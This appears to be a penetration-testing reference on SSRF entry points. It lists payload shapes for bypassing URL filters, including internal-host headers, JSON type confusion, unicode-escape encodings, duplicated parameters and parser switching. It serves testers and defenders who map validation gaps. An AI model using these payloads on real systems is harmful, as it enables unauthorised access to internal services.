# Request shapes — where the url-control enters the request

The url-field arrives in a query-param, a json-body, a form-field,
a header, a multipart-field — each has its own surface. The entry-
point determines what tricks are available.

---

## 1. The GET-query surface

```text
GET /fetch?url=http://x/
   — the query-param — %-encoded — the standard —
   — the query is logged, length-limited, cache-keyed — the url
     is right there in the log — and the %-encoding in the query
     is the first decode-layer — the %0d%0a tricks ride the query
   — the query-param order — url=first vs url=last — param-
     duplication: ?url=a&url=b — which wins?
```

## 2. The POST-form surface

```text
POST /fetch  Content-Type: application/x-www-form-urlencoded
url=http://x/
   — the form-field — the same %-decode — the param-dup the same —
   — the form-field-name variants — the url/link/src/target
     vocabulary — json-params.md
```

## 3. The POST-json surface

```text
POST /fetch  Content-Type: application/json
{"url":"http://x/"}
   — the json-body — the field is a json-VALUE — the object/array/
     nested shapes — json-params.md — the type-confusion tricks:
     the field expects a string — give it an object/array/number/
     null — the type-check the app didn't write
   — {"url":["http://x/"]} — array-for-string
   — {"url":{"host":"internal","port":6379}} — the object-shape
   — {"url":null} — the null — the app's null-handling
   — {"url":true} — bool — the truthy-handling
   — {"url":123} — number — the toString — "123" — a name
```

## 4. The multipart surface

```text
POST /fetch  Content-Type: multipart/form-data; boundary=--
   — a url in a field — the form-boundary — the field-name —
   — the file-FIELD — filename="http://x/" — some importers take
     the filename as the source — or the filename contains a url
   — the boundary-confusion — a url inside a file-part's CONTENT
     — the app reads the part — the part-content is the url —
     the "upload a file containing the url" — reads-then-fetches
```

## 5. The header-carried surface

```text
the url lives in a header — the app reads the header to fetch:
  X-Forwarded-Host: internal   — the forwarded-host → the app's
                                 fetch-target — host-header attack
  X-Forwarded-Server: internal
  X-Host: internal
  X-Original-Host: internal
  X-Original-URL: http://internal/
  X-Rewrite-URL: http://internal/
  Referer: http://internal/    — the referer-fetch — analytics
  X-Proxy-Url / X-Target-Url — the proxy-headers
  X-Api-Url: http://internal/
  X-Backend-Url: http://internal/
  X-Callback-Url: http://internal/
  X-Webhook-Url: http://internal/
   — the header-as-fetch-source — the trusted-header shapes —
     web-host-header is the sibling-class — when the app reads a
     header to pick a fetch-target → the host-header attack —
     this reference covers it as the SSRF-entry surface
```

## 6. The cookie-carried surface

```text
Cookie: session=...; api_url=http://internal/
   — a cookie-value the app reads to fetch — the trusted-cookie —
     rare — the session-data containing a url
```

## 7. The body-embedded surface — the url INSIDE content

```text
- an xml-document with a url-element — the xxe-boundary — the
  document is fetched then its url-refs followed — the xml-
  external-content — web-xxe — but the document's INTERNAL urls
  are the ssrf-surface
- a json-document with url-fields — the json-refs — the app
  follows them — the "import this config which references urls"
- a markdown/html-document with url-refs — the preview-renderer
  fetches the images/links inside — the content-ssrf — the
  document-you-provide's urls get fetched
- a pdf/doc with embedded-urls — the document-parser fetches —
  the embedded-resource-fetch
- an svg with xlink:href= — the svg-renderer fetches the
  referenced-resource — svg+ssrf
- a feed-xml with enclosure-urls — the feed-reader fetches
```

## 8. The deferred surface — the stored-url

```text
- the url is stored then fetched later — the webhook/feed/callback
  — the store-then-fetch — the response is the deferred-result —
  the storage-shape matters:
  - stored as a STRING → the parse happens at fetch-time — the
    raw string reaches the fetcher — the url-tricks survive
  - stored PARSED → the parse ran at input — the host/scheme were
    extracted at write — the field-split — the object-fields are
    stored — the fetch reassembles — the parts-injection
```

## 9. The path-segment surface

```text
GET /fetch/http://x/          — the url-in-the-path — the path-
                                 carries the url — the rewrite-
                                 rules may mangle it — the %-decode
                                 — the double-slash-collapse —
                                 the path-normalization — the
                                 segments-merge — the url survives?
GET /proxy/http://internal/
GET /fetch/aHR0cDovL3gv         — base64-in-path
GET /render?template=x&url=y    — the url as a second-param
```

## 10. The request-line surface — the rare one

```text
GET http://internal/x HTTP/1.1  — the absolute-form request-line —
                                  the proxy-request-shape — the
                                  frontend treats it as absolute-
                                  url → fetches the internal —
                                  the http-request-target as the
                                  ssrf-vector — the absolute-uri
                                  in the request-line — proxy-apps
                                  and origin-servers handle it
                                  differently — the request-line
                                  is a url
```

## 11. The websocket-message surface

```text
the url arrives inside a ws-message — the app fetches per-message —
  {"type":"fetch","url":"http://internal/"} — the ws-frame —
  the ws-channel — the fetch-context is the ws-handler's
```

## 12. The order-of-application — decode/fetch/check sequence

```text
the sequence determines which tricks work:
  decode → check → fetch      — the decoded-form is checked —
                                the encoding-bypasses die — the
                                decoded-form must pass
  check → decode → fetch      — the encoded-form is checked —
                                the raw-string must pass — the
                                decoded-internal bypasses
  decode → fetch (no check)   — free — all encodings work
  check → fetch (no decode)   — the raw string is fetched — the
                                encoded-forms reach the wire
  fetch-then-check (rare)     — the fetched-content is checked —
                                the fetch already ran — too late
```

The decode-vs-check order is THE question — `sanitizer_fuzz` maps
it empirically — which encoded-forms pass reveals where the
check sits in the sequence.

## 13. The param-duplication — two urls

```text
?url=http://x/&url=http://internal/
   — which one fetches? — the framework's param-handling:
     php: last-wins / arrays
     express: first? array?
     flask: getlist vs get — first
     asp.net: comma-joined
     java: getParameter = first
     the app may CHECK the first and FETCH the last — or the
     opposite — the differential is the bypass — send both orders
```

## 14. The content-type tricks — the parser-switch

```text
the same url-param under different content-types → different
parsers → different decode-rules:
  url=http://internal/           — form — %-decoded
  {"url":"http://internal/"}     — json — json-decoded — the \u
                                   escapes! "\u0068ttp://internal"
                                   — json's unicode-escapes are a
                                   decode-layer — \u0061 = a —
                                   the check sees the escaped
                                   form — the fetcher decodes —
                                   the json-unicode bypass
  <url>http://internal/</url>    — xml — entity-refs — &x27; etc
```

The JSON `\uXXXX` — the check sees `\u0031\u0032\u0037` — the
fetcher decodes to `127` — a decode-layer most checks miss.

## 15. The surface-to-chain table

| Surface | Trick | Bypass-family |
|---|---|---|
| query | %-encode | the encoding-family |
| form | %-encode | the encoding-family |
| json | \u-escape + object-shapes | the json-family |
| xml | entity-refs | the xml-family |
| header | the trusted-header | the header-family |
| multipart | field-boundary | the form-family |
| path | normalization | the path-family |
| deferred | the store-shape | the second-order |
| ws | the message-shape | the frame-family |
| request-line | absolute-form | the proxy-family |
